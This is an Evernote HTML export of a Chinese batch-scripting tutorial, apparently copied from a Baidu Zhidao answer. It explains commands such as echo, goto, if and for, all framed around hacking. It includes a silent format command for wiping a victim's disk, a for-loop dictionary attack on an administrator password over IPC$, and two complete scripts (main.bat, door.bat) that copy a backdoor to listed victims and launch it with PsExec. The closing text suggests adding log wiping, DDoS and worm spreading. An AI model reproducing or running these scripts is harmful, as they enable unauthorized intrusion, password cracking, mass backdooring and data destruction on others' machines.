<html>
<head>
  <title>批处理命令大全.html</title>
  <basefont face="微软雅黑" size="2" />
  <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
  <meta name="exporter-version" content="Evernote Windows/306387 (zh-CN, DDL); Windows/10.0.0 (Win64);"/>
  <style>
    body, td {
      font-family: 微软雅黑;
      font-size: 10pt;
    }
  </style>
</head>
<body>
<a name="889"/>
<h1>批处理命令大全.html</h1>

<div>
<span><pre>
1.Echo 命令<br/>打开回显或关闭请求回显功能，或显示消息。如果没有任何参数，echo 命令将显示当前回显设置。<br/>语法<br/>echo [{on|off}] [message]<br/>Sample篅echo off / echo hello world<br/>在实际应用中我们会把这条命令和重定向符号（也称为管道符号，一般用&gt; &gt;&gt; ^）结合来实现输入一些命令到特定格式的文件中.这将在以后的例子中体现出来。<br/><br/>2.@ 命令<br/>表示不显示@后面的命令，在入侵过程中（例如使用批处理来格式化敌人的硬盘）自然不能让对方看到你使用的命令啦。<br/>Sample：@echo off<br/>@echo Now initializing the program,please wait a minite...<br/>@format X: /q/u/autoset (format 这个命令是不可以使用/y这个参数的，可喜的是微软留了个autoset这个参数给我们，效果和/y是一样的。)<br/><br/>3.Goto 命令<br/>指定跳转到标签，找到标签后，程序将处理从下一行开始的命令。<br/>语法：goto label （label是参数，指定所要转向的批处理程序中的行。） <br/>Sample：<br/>if {%1}=={} goto noparms<br/>if {%2}=={} goto noparms（如果这里的if、%1、%2你不明白的话，先跳过去，后面会有详细的解释。）<br/>@Rem check parameters if null show usage<br/>:noparms<br/>echo Usage: monitor.bat ServerIP PortNumber<br/>goto end<br/>标签的名字可以随便起，但是最好是有意义的字母啦，字母前加个：用来表示这个字母是标签，goto命令就是根据这个：来寻找下一步跳到到那里。最好有一些说明这样你别人看起来才会理解你的意图啊。<br/><br/>4.Rem 命令<br/>注释命令，在C语言中相当与/*--------*/,它并不会被执行，只是起一个注释的作用，便于别人阅读和你自己日后修改。<br/>Rem Message<br/>Sample：@Rem Here is the description.<br/><br/>5.Pause 命令<br/>运行 Pause 命令时，将显示下面的消息： <br/>Press any key to continue . . . <br/>Sample：<br/>@echo off <br/>:begin <br/>copy a:*.* d：\back<br/>echo Please put a new disk into driver A <br/>pause <br/>goto begin <br/>在这个例子中，驱动器 A 中磁盘上的所有文件均复制到d:\back中。显示的注释提示您将另一张磁盘放入驱动器 A 时，pause 命令会使程序挂起，以便您更换磁盘，然后按任意键继续处理。<br/><br/>6.Call 命令<br/>从一个批处理程序调用另一个批处理程序，并且不终止父批处理程序。call 命令接受用作调用目标的标签。如果在脚本或批处理文件外使用 Call，它将不会在命令行起作用。<br/>语法<br/>call [[Drive:][Path] FileName [BatchParameters]] [:label [arguments]]<br/>参数<br/>[Drive:}[Path] FileName <br/>指定要调用的批处理程序的位置和名称。filename 参数必须具有 .bat 或 .cmd 扩展名。<br/><br/>7.start 命令<br/>调用外部程序，所有的DOS命令和命令行程序都可以由start命令来调用。<br/>入侵常用参数：<br/>MIN 开始时窗口最小化<br/>SEPARATE 在分开的空间内开始 16 位 Windows 程序<br/>HIGH 在 HIGH 优先级类别开始应用程序<br/>REALTIME 在 REALTIME 优先级类别开始应用程序<br/>WAIT 启动应用程序并等候它结束<br/>parameters 这些为传送到命令/程序的参数<br/>执行的应用程序是 32-位 GUI 应用程序时，CMD.EXE 不等应用程序终止就返回命令提示。如果在命令脚本内执行，该新行为则不会发生。<br/>8.choice 命令<br/>choice 使用此命令可以让用户输入一个字符，从而运行不同的命令。使用时应该加/c:参数，c:后应写提示可输入的字符，之间无空格。它的返回码为1234……<br/><br/>如: choice /c:dme defrag,mem,end<br/>将显示<br/>defrag,mem,end[D,M,E]?<br/>Sample：<br/>Sample.bat的内容如下: <br/>@echo off <br/>choice /c:dme defrag,mem,end <br/>if errorlevel 3 goto defrag （应先判断数值最高的错误码）<br/>if errorlevel 2 goto mem <br/>if errotlevel 1 goto end <br/><br/>:defrag <br/>c:\dos\defrag <br/>goto end <br/>:mem <br/>mem <br/>goto end <br/>:end <br/>echo good bye<br/><br/>此文件运行后，将显示 defrag,mem,end[D,M,E]? 用户可选择d m e ，然后if语句将作出判断，d表示执行标号为defrag的程序段，m表示执行标号为mem的程序段，e表示执行标号为end的程序段，每个程序段最后都以goto end将程序跳到end标号处，然后程序将显示good bye，文件结束。<br/><br/>9.If 命令<br/><br/>if 表示将判断是否符合规定的条件，从而决定执行不同的命令。 有三种格式: <br/>1、if &quot;参数&quot; == &quot;字符串&quot;  待执行的命令 <br/>参数如果等于指定的字符串，则条件成立，运行命令，否则运行下一句。(注意是两个等号）<br/>如if &quot;%1&quot;==&quot;a&quot; format a: <br/>if {%1}=={} goto noparms<br/>if {%2}=={} goto noparms<br/><br/>2、if exist 文件名  待执行的命令 <br/>如果有指定的文件，则条件成立，运行命令，否则运行下一句。<br/>如if exist config.sys edit config.sys <br/><br/>3、if errorlevel / if not errorlevel 数字  待执行的命令 <br/>如果返回码等于指定的数字，则条件成立，运行命令，否则运行下一句。<br/>如if errorlevel 2 goto x2  <br/>DOS程序运行时都会返回一个数字给DOS，称为错误码errorlevel或称返回码，常见的返回码为0、1。<br/><br/>10.for 命令<br/>for 命令是一个比较复杂的命令，主要用于参数在指定的范围内循环执行命令。<br/>在批处理文件中使用 FOR 命令时，指定变量请使用 %%variable<br/><br/>for {%variable|%%variable} in (set) do command [ CommandLineOptions]<br/>%variable 指定一个单一字母可替换的参数。<br/>(set) 指定一个或一组文件。可以使用通配符。<br/>command 指定对每个文件执行的命令。<br/>command-parameters 为特定命令指定参数或命令行开关。<br/>在批处理文件中使用 FOR 命令时，指定变量请使用 %%variable<br/>而不要用 %variable。变量名称是区分大小写的，所以 %i 不同于 %I<br/><br/>如果命令扩展名被启用，下列额外的 FOR 命令格式会受到<br/>支持:<br/><br/>FOR /D %variable IN (set) DO command [command-parameters]<br/><br/>如果集中包含通配符，则指定与目录名匹配，而不与文件<br/>名匹配。<br/><br/>FOR /R [[drive:]path] %variable IN (set) DO command [command-<br/><br/>检查以 [drive:]path 为根的目录树，指向每个目录中的<br/>FOR 语句。如果在 /R 后没有指定目录，则使用当前<br/>目录。如果集仅为一个单点(.)字符，则枚举该目录树。<br/><br/>FOR /L %variable IN (start,step,end) DO command [command-para<br/><br/>该集表示以增量形式从开始到结束的一个数字序列。<br/>因此，(1,1,5) 将产生序列 1 2 3 4 5，(5,-1,1) 将产生<br/>序列 (5 4 3 2 1)。<br/><br/>FOR /F [&quot;options&quot;] %variable IN (file-set) DO command <br/>FOR /F [&quot;options&quot;] %variable IN (&quot;string&quot;) DO command <br/>FOR /F [&quot;options&quot;] %variable IN (command) DO command <br/><br/>或者，如果有 usebackq 选项:<br/><br/>FOR /F [&quot;options&quot;] %variable IN (file-set) DO command <br/>FOR /F [&quot;options&quot;] %variable IN (&quot;string&quot;) DO command <br/>FOR /F [&quot;options&quot;] %variable IN (command) DO command <br/><br/>filenameset 为一个或多个文件名。继续到 filenameset 中的<br/>下一个文件之前，每份文件都已被打开、读取并经过处理。<br/>处理包括读取文件，将其分成一行行的文字，然后将每行<br/>解析成零或更多的符号。然后用已找到的符号字符串变量值<br/>调用 For 循环。以默认方式，/F 通过每个文件的每一行中分开<br/>的第一个空白符号。跳过空白行。您可通过指定可选 &quot;options&quot;<br/>参数替代默认解析操作。这个带引号的字符串包括一个或多个<br/>指定不同解析选项的关键字。这些关键字为:<br/><br/>eol=c - 指一个行注释字符的结尾(就一个)<br/>skip=n - 指在文件开始时忽略的行数。<br/>delims=xxx - 指分隔符集。这个替换了空格和跳格键的<br/>默认分隔符集。<br/>tokens=x,y,m-n - 指每行的哪一个符号被传递到每个迭代<br/>的 for 本身。这会导致额外变量名称的<br/>格式为一个范围。通过 nth 符号指定 m<br/>符号字符串中的最后一个字符星号，<br/>那么额外的变量将在最后一个符号解析之<br/>分配并接受行的保留文本。<br/>usebackq - 指定新语法已在下类情况中使用:<br/>在作为命令执行一个后引号的字符串并且<br/>引号字符为文字字符串命令并允许在 fi<br/>中使用双引号扩起文件名称。<br/><br/>sample1:<br/>FOR /F &quot;eol=; tokens=2,3* delims=, &quot; %i in (myfile.txt) do command<br/><br/>会分析 myfile.txt 中的每一行，忽略以分号打头的那些行，将<br/>每行中的第二个和第三个符号传递给 for 程序体；用逗号和/或<br/>空格定界符号。请注意，这个 for 程序体的语句引用 %i 来<br/>取得第二个符号，引用 %j 来取得第三个符号，引用 %k<br/>来取得第三个符号后的所有剩余符号。对于带有空格的文件<br/>名，您需要用双引号将文件名括起来。为了用这种方式来使<br/>用双引号，您还需要使用 usebackq 选项，否则，双引号会<br/>被理解成是用作定义某个要分析的字符串的。<br/><br/>%i 专门在 for 语句中得到说明，%j 和 %k 是通过<br/>tokens= 选项专门得到说明的。您可以通过 tokens= 一行<br/>指定最多 26 个符号，只要不试图说明一个高于字母 z 或<br/>Z 的变量。请记住，FOR 变量是单一字母、分大小写和全局的；<br/>同时不能有 52 个以上都在使用中。<br/><br/>您还可以在相邻字符串上使用 FOR /F 分析逻辑；方法是，<br/>用单引号将括号之间的 filenameset 括起来。这样，该字符<br/>串会被当作一个文件中的一个单一输入行。<br/><br/>最后，您可以用 FOR /F 命令来分析命令的输出。方法是，将<br/>括号之间的 filenameset 变成一个反括字符串。该字符串会<br/>被当作命令行，传递到一个子 CMD.EXE，其输出会被抓进<br/>内存，并被当作文件分析。因此，以下例子:<br/><br/>FOR /F &quot;usebackq delims==&quot; %i IN (`set`) DO @echo %i<br/><br/>会枚举当前环境中的环境变量名称。<br/><br/>另外，FOR 变量参照的替换已被增强。您现在可以使用下列<br/>选项语法:<br/><br/>~I - 删除任何引号(&quot;)，扩充 %I<br/>%~fI - 将 %I 扩充到一个完全合格的路径名<br/>%~dI - 仅将 %I 扩充到一个驱动器号<br/>%~pI - 仅将 %I 扩充到一个路径<br/>%~nI - 仅将 %I 扩充到一个文件名<br/>%~xI - 仅将 %I 扩充到一个文件扩展名<br/>%~sI - 扩充的路径只含有短名<br/>%~aI - 将 %I 扩充到文件的文件属性<br/>%~tI - 将 %I 扩充到文件的日期/时间<br/>%~zI - 将 %I 扩充到文件的大小<br/>%~$PATH:I - 查找列在路径环境变量的目录，并将 %I 扩充<br/>到找到的第一个完全合格的名称。如果环境变量<br/>未被定义，或者没有找到文件，此组合键会扩充<br/>空字符串<br/><br/>可以组合修饰符来得到多重结果:<br/><br/>%~dpI - 仅将 %I 扩充到一个驱动器号和路径<br/>%~nxI - 仅将 %I 扩充到一个文件名和扩展名<br/>%~fsI - 仅将 %I 扩充到一个带有短名的完整路径名<br/>%~dp$PATH:i - 查找列在路径环境变量的目录，并将 %I 扩充<br/>到找到的第一个驱动器号和路径。<br/>%~ftzaI - 将 %I 扩充到类似输出线路的 DIR<br/><br/>在以上例子中，%I 和 PATH 可用其他有效数值代替。%~ 语法<br/>用一个有效的 FOR 变量名终止。选取类似 %I 的大写变量名<br/>比较易读，而且避免与不分大小写的组合键混淆。<br/><br/>以上是MS的官方帮助，下面我们举几个例子来具体说明一下For命令在入侵中的用途。<br/><br/>sample2：<br/><br/>利用For命令来实现对一台目标Win2k主机的暴力密码破解。<br/>我们用net use \\ip\ipc$ &quot;password&quot; /u:&quot;administrator&quot;来尝试这和目标主机进行连接，当成功时记下密码。<br/>最主要的命令是一条：for /f i% in (dict.txt) do net use \\ip\ipc$ &quot;i%&quot; /u:&quot;administrator&quot;<br/>用i%来表示admin的密码，在dict.txt中这个取i%的值用net use 命令来连接。然后将程序运行结果传递给find命令－－<br/>for /f i%% in (dict.txt) do net use \\ip\ipc$ &quot;i%%&quot; /u:&quot;administrator&quot;|find &quot;:命令成功完成&quot;&gt;&gt;D:\ok.txt ，这样就ko了。<br/><br/>sample3：<br/><br/>你有没有过手里有大量肉鸡等着你去种后门＋木马呢？，当数量特别多的时候，原本很开心的一件事都会变得很郁闷：）。文章开头就谈到使用批处理文件，可以简化日常或重复性任务。那么如何实现呢？呵呵，看下去你就会明白了。<br/><br/>主要命令也只有一条：（在批处理文件中使用 FOR 命令时，指定变量使用 %%variable）<br/>@for /f &quot;tokens=1,2,3 delims= &quot; %%i in (victim.txt) do start call door.bat %%i %%j %%k<br/>tokens的用法请参见上面的sample1，在这里它表示按顺序将victim.txt中的内容传递给door.bat中的参数%i %j %k。<br/>而cultivate.bat无非就是用net use命令来建立IPC$连接，并copy木马＋后门到victim，然后用返回码（If errorlever =）来筛选成功种植后门的主机，并echo出来，或者echo到指定的文件。<br/>delims= 表示vivtim.txt中的内容是一空格来分隔的。我想看到这里你也一定明白这victim.txt里的内容是什么样的了。应该根据%%i %%j %%k表示的对象来排列，一般就是 ip password username。<br/>代码雏形：<br/><br/>--------------- cut here then save as a batchfile(I call it main.bat ) ---------------------------<br/>@echo off<br/>@if &quot;%1&quot;==&quot;&quot; goto usage<br/>@for /f &quot;tokens=1,2,3 delims= &quot; %%i in (victim.txt) do start call IPChack.bat %%i %%j %%k<br/>@goto end<br/>:usage<br/>@echo run this batch in dos modle.or just double-click it.<br/>:end<br/>--------------- cut here then save as a batchfile(I call it main.bat ) ---------------------------<br/><br/>------------------- cut here then save as a batchfile(I call it door.bat) -----------------------------<br/>@net use \\%1\ipc$ %3 /u:&quot;%2&quot;<br/>@if errorlevel 1 goto failed<br/>@echo Trying to establish the IPC$ connection …………OK<br/>@copy windrv32.exe\\%1\admin$\system32 &amp;&amp; if not errorlevel 1 echo IP %1 USER %2 PWD %3 &gt;&gt;ko.txt<br/>@p***ec \\%1 c:\winnt\system32\windrv32.exe<br/>@p***ec \\%1 net start windrv32 &amp;&amp; if not errorlevel 1 echo %1 Backdoored &gt;&gt;ko.txt<br/>:failed<br/>@echo Sorry can not connected to the victim.<br/>----------------- cut here then save as a batchfile(I call it door.bat) --------------------------------<br/>这只是一个自动种植后门批处理的雏形，两个批处理和后门程序（Windrv32.exe）,PSexec.exe需放在统一目录下.批处理内容<br/>尚可扩展,例如:加入清除日志+DDOS的功能,加入定时添加用户的功能,更深入一点可以使之具备自动传播功能(蠕虫).此处不多做叙述,有兴趣的朋友可自行研究.
</pre><br/><div style="color:gray"><small>来源： &lt;<a href="http://zhidao.baidu.com/question/777024.html">http://zhidao.baidu.com/question/777024.html</a><small>&gt;</small></small></div><small><small> </small></small></span>
</div></body></html> 